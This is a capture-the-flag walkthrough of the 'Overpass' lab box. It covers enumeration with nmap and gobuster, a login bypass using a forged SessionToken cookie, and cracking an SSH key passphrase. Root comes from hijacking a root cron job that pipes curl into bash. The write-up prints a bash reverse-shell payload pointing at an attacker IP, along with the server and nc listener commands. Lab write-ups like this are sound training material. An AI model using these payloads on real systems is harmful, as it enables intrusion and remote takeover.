New Day, New Box 

Today we started Overpass box, to started we have launch a nmap for get all ports and all informations who can use.

<img width="1287" height="421" alt="image" src="https://github.com/user-attachments/assets/3c4e6f5c-a0d7-47bf-b02c-548c9f1cb52d" />

Next, we launch a gobduster to found all pages 

<img width="1322" height="616" alt="image" src="https://github.com/user-attachments/assets/7643a12e-f972-45f3-b6d0-7c2624c6018f" />

We can see a admin page when we going on, we can see it's not a simple page, it's login page and in the URL look like this 

`http://overpass.thm/admin/`

It can see he have other pages on `/admin/`, so we have launch godbuster on `/admin/`

<img width="1324" height="509" alt="image" src="https://github.com/user-attachments/assets/4e42443a-b90b-4dc0-922a-2f80290848ab" />

So we can see, he have a `index.html`, when we going on this url `http://overpass.thm/admin/index.html` he redirect on `http://overpass.thm/admin/`. 
So we have curl this page `http://overpass.thm/admin/` to know what is contain

<img width="1303" height="914" alt="image" src="https://github.com/user-attachments/assets/2bbafc90-83e8-4765-a844-dc02e7919425" />

In the balise script we can see `login.js`, so we going on this url `http://overpass.thm/login.js` to know what this file contain 

<img width="850" height="756" alt="image" src="https://github.com/user-attachments/assets/50e2997c-4ebc-4d5f-a315-59e245e4ac0c" />

And this file we can see a biggest error, on the condition who check the content of the cookie

<img width="400" height="112" alt="image" src="https://github.com/user-attachments/assets/e86691c3-bf0b-49aa-beb9-78da60f6f9a6" />

So if the cookie it's filled with random data and with the title `SessionToken`, he can acces on admin page

<img width="1181" height="295" alt="image" src="https://github.com/user-attachments/assets/4c56245e-a41e-4711-afaa-b0ac0b5e7f8a" />

It's Good we can reload we cookie and the admin page and BINGO !!! 
We have access on the admin page hovewer it's not finish, on the admin page we have a rsa key with a message 

<img width="959" height="781" alt="image" src="https://github.com/user-attachments/assets/af8e928c-eda6-4f8c-a981-db066005f964" />

So we create a file rsa_key who contain this rsa key we give a good permission on this file `chmod 600 rsa_key`
Now, we can test to connected an ssh with the rsa_key

<img width="1017" height="66" alt="image" src="https://github.com/user-attachments/assets/7f4f3f2c-0127-4bad-abf5-31ac188c4467" />

New problem, new solution, he ask a passPhrase for key, to get her we have use john2ripper like this

<img width="1322" height="695" alt="image" src="https://github.com/user-attachments/assets/d22b1878-1a54-463f-959c-990ba0b75b15" />

Now we can retest the connection with ssh and the rsa key

<img width="1225" height="1015" alt="image" src="https://github.com/user-attachments/assets/38358840-27ab-4f6a-ac3f-92379acf682a" />

BINGO !!!! we are connected as james and we can get the first flag user.txt

<img width="428" height="70" alt="image" src="https://github.com/user-attachments/assets/24f2df07-0619-44a1-8362-d891c0522e44" />

---
Lets find the root flag !


```
cat /etc/crontab
```

Something interesting here 

<img width="703" height="327" alt="image" src="https://github.com/user-attachments/assets/c68327b6-06b0-4d22-ae92-7772dfb7e386" />

so what's happening in this command :
```
curl overpass.thm/downloads/src/script.sh | bash
```
it downloads the resource and then directly execute it as a root ! 

so lets try to modify the /etc/hosts to make point at our ip address 

<img width="703" height="327" alt="image" src="https://github.com/user-attachments/assets/d2a203bf-eacc-4e18-9314-f294f026f795" />


so right now, we're going to create exactly the same path as the curl in order to have this path at the end in our attacker machine :
```
IP_ATTACKER/downloads/src/buildscript.sh
```
and lets insert a rev shell inside the buildscript.sh
```
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1
```

<img width="703" height="92" alt="image" src="https://github.com/user-attachments/assets/aa7caa86-7501-49d4-9e9b-e75fa2e54aab" />



open a python server in a terminal before the downloads directory
```
python -m http.server 80
```

and in the other side a listner

```
nc -nvlp 4444
```

and wait a minute !

<img width="703" height="92" alt="image" src="https://github.com/user-attachments/assets/eaa4a8b8-3b14-409e-be03-50993824922c" />

congrats ! 

<img width="714" height="175" alt="image" src="https://github.com/user-attachments/assets/6bb27e5c-7e3c-42a3-a515-04336f991594" />
